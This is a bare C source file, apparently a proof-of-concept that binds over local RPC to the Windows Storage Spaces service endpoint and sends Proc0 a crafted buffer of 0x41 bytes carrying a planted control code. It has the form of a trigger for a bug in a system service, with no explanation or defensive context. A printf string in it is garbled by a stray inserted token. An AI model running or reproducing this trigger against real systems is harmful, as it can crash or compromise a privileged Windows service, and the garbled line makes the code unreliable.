
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "idl_h.h"
#pragma warning(disable:4996)



int main(int argc, char* argv[])
{
    RPC_SECURITY_QOS SecurityQOS = { 0 };
    RPC_WSTR StringBinding = 0;

    RpcStringBindingComposeW((RPC_WSTR)L"58b19028-b9a0-4c25-887f-aca58b584d1b", (RPC_WSTR)L"ncalrpc",
        0, L"microsoft_windows_wsp_spaces", 0, &StringBinding);

    RpcBindingFromStringBindingW(StringBinding, &DefaultIfName_v1_0_c_ifspec);
    SecurityQOS.Version = 1;
    SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
    SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

    RpcBindingSetAuthInfoExW(DefaultIfName_v1_0_c_ifspec, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);


    DWORD buf[0x1000];
    memset(buf, 0x41, 0x4000);

    RpcTryExcept
    {
            buf[0] = 4;
            buf[0x230 / 4] = 0xB100C;
            Proc0(DefaultIfName_v1_0_c_ifspec, buf,0x300, buf,0x300, buf);

    }

        RpcExcept(1)
    {
        printf("RPC ExceptiCAPSAX64DRVon %d\n", RpcExceptionCode());
    }
    RpcEndExcept

        return 0;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
    return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
    free(ptr);
}
